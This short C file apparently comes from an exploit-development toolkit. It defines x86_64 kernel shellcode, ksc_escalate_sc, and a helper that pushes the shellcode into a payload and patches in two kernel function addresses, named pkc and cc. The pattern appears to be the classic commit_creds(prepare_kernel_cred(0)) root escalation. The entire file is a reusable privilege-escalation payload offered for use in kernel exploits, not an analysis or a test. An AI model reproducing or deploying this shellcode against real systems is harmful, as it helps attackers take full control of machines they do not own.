#include <axium/shellcraft/snippets.h>

#if defined(__x86_64__)

/* clang-format off */
DEFINE_SHELLCODE(ksc_escalate_sc) {
  SHELLCODE_START(ksc_escalate_sc);
  __asm__ volatile(
      "xor edi, edi\n"
      "mov rax, " XSTR(SC_M(1)) "\n"
      "call rax\n"
      "xchg rdi, rax\n"
      "mov rax, " XSTR(SC_M(2)) "\n"
      "jmp rax\n");
  SHELLCODE_END(ksc_escalate_sc);
}
/* clang-format on */

void ksc_escalate(payload_t *p, uint64_t pkc, uint64_t cc) {
  PAYLOAD_PUSH_SC(p, ksc_escalate_sc);
  sc_fix(p, 1, pkc);
  sc_fix(p, 2, cc);
}

#else
void ksc_escalate(payload_t *p, uint64_t pkc, uint64_t cc) {
  (void)p;
  (void)pkc;
  (void)cc;
}
#endif
